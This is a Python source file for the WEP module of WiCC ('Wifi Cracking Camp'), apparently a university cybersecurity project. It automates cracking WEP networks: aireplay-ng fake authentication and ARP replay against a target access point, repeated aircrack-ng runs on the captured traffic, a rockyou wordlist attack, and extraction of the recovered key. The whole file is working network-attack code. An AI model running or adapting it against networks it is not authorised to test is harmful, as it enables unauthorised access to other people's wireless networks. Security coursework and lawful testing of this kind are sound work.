#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
    WiCC (Wifi Cracking Camp)
    GUI tool for wireless cracking on WEP and WPA/WPA2 networks.
    Project developed by Pablo Sanz Alguacil and Miguel Yanes Fernández, as the Group Project for the 3rd year of the
    Bachelor of Sicence in Computing in Digital Forensics and CyberSecurity, at TU Dublin - Blanchardstown Campus
"""

from wicc_enc_type import EncryptionType
import time
import threading


class WEP(EncryptionType):
    def __init__(self, network, interface, mac, verbose_level, silent_attack, write_directory):
        """
        Constructor for the WEP class (also calls the parent constructor)
        :param network: target network for the attack
        :param interface: selected wireless interface
        :param mac: attacker mac address
        :param verbose_level: verbose level set by main
        :param silent_attack: option to do a silent scan
        :param write_directory: directory to write the generated files

        :Author: Miguel Yanes Fernández
        """
        EncryptionType.__init__(self, network, interface, verbose_level, silent_attack, write_directory)
        self.mac = mac
        self.running_with_wordlist = False
        self.running_aircrack = False

    def scan_network(self):
        """
        Method to scan the target network. With the selected attacker's mac, makes a fake authentication to the network
        to then send arp responses to generate data.
        :param write_directory: directory to write the scan files
        :return: none

        :Author: Miguel Yanes Fernández
        """
        super(WEP, self).scan_network()

        if not self.silent_attack:
            self.execute_command(['rm', self.write_directory + '/replay*'])
            fakeauth_cmd = ['aireplay-ng', '--fakeauth', '0', '-b', self.bssid, '-e', self.essid, '-T', '3',
                            self.interface, '-h', self.mac]
            arpreplay_cmd = ['aireplay-ng', '--arpreplay', '-b', self.bssid, '-h', self.mac,
                             '--ignore-negative-one', self.interface]

            fakeauth_out, err = self.execute_command(fakeauth_cmd)
            self.show_message("Faked authentication on ap: " + self.bssid + " with MAC: " + self.mac)
            # self.show_message(fakeauth_out.decode('utf-8'))

            arpreplay_thread = threading.Thread(target=self.execute_command, args=(arpreplay_cmd,))
            arpreplay_thread.start()
            arpreplay_thread.join(0)

            self.show_message("Running aireplay thread on mac: " + self.mac)

            counter = 0
        else:
            super().show_message("Running silent attack (no fake auth and no arp replay)")

        self.password = ""

        pgrep_aireplay_cmd = ['pgrep', 'aireplay']

        while self.password == "":
            if not self.running_aircrack:
                crack_thread = threading.Thread(target=self.crack_network)
                crack_thread.start()
            time.sleep(1)
            if not self.silent_attack and self.password == "":
                if counter == 20:
                    self.show_message("Reseting aireplay every 20 seconds . . .")
                    pgrep_out, err = self.execute_command(pgrep_aireplay_cmd)

                    pgrep_out = pgrep_out.decode('utf-8')

                    if pgrep_out != "":
                        pids = pgrep_out.split('\n')
                        for pid in pids:
                            if pid != "":
                                self.execute_command(['kill', '-9', pid])

                    fakeauth_out, err = self.execute_command(fakeauth_cmd)
                    self.show_message("Faked authentication on ap: " + self.bssid + " with MAC: " + self.mac)
                    # self.show_message(fakeauth_out.decode('utf-8'))
                    arpreplay_thread = threading.Thread(target=self.execute_command, args=(arpreplay_cmd,))
                    arpreplay_thread.start()
                    arpreplay_thread.join(0)
                    self.show_message("Running aireplay thread on mac: " + self.mac)

                    if not self.running_with_wordlist:
                        aircrack_wordlist_thread = threading.Thread(target=self.aircrack_wordlist)
                        aircrack_wordlist_thread.start()

                    counter = 0
                else:
                    counter+=1
        return self.password

    def crack_network(self):
        """
        Crack the selected network. Aircrack is left running until if gets enough iv's to crack the connection key
        :return: password key

        :Author: Miguel Yanes Fernández
        """
        self.running_aircrack = True
        self.execute_command(['rm', self.write_directory + '/aircrack_out_' + str(self.timestamp)])
        self.execute_command(['touch', self.write_directory + '/aircrack_out_' + str(self.timestamp)])
        password = ""
        aircrack_cmd = ['timeout', '10', 'aircrack-ng',
                        self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap',
                        '>', self.write_directory + '/aircrack_out_' + str(self.timestamp)]
        self.show_message("Running aircrack thread")
        self.execute_command(aircrack_cmd)
        time.sleep(1)
        print("executed aircrack")
        with open(self.write_directory + '/aircrack_out_' + str(self.timestamp), 'r') as file:
            password = self.filter_aircrack(file.read())

        self.running_aircrack = False

        self.password = password

    def aircrack_wordlist(self):
        """
        Cracks the capture file with the selected wordlist
        :return: password key (if found in the wordlist)
        :Author: Miguel Yanes Fernández
        """
        self.show_message("running with wordlist")
        self.running_with_wordlist = True
        aircrack_wordlist_cmd = ['aircrack-ng', self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap',
                                 '-w', '/usr/share/wordlists/rockyou.txt']
        out, err = self.execute_command(aircrack_wordlist_cmd)
        self.show_message("\n\tFinished with wordlist")
        password = self.filter_aircrack(out.decode("utf-8"))
        self.password = password

        self.running_with_wordlist = False

    def filter_aircrack(self, output):
        """
        Filter the aircrack output to read the password (if any is found)
        :param output: output from the aicrack command
        :return: password (or "" if it wasn't found)

        :Author: Miguel Yanes Fernández
        """
        words = output.split(" ")
        for i in range(0, len(words)):
            if words[i] == "(ASCII:":
                return words[i + 1]
        self.show_message("No password found in the capture file")
        return ""
